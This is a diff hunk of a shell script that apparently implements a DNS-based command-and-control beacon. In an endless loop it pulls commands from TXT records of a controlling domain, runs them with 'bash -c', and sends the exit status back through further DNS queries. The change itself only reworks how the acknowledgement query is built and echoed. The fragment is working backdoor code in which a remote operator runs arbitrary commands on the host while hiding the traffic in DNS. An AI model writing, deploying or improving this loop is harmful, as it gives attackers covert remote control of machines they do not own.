@@ -13,8 +13,9 @@ while true ; do
 	cmd=$(dig +short "$uniqid.$randprefix$origin" TXT | sed s/^\"// | sed s/\"$//)
 	echo "Running $cmd"
 	bash -c "$cmd"
-	echo "Exit status: $?.$uniqid.$randprefix.ack$origin"
-	dig "$?.$uniqid.$randprefix.ack$origin" TXT +short &> /dev/null
+	request="$?.$uniqid.$randprefix.ack$origin" 
+	echo "Request: $request"
+	dig "$request" TXT +short &> /dev/null
 
 	sleep 5 
 done
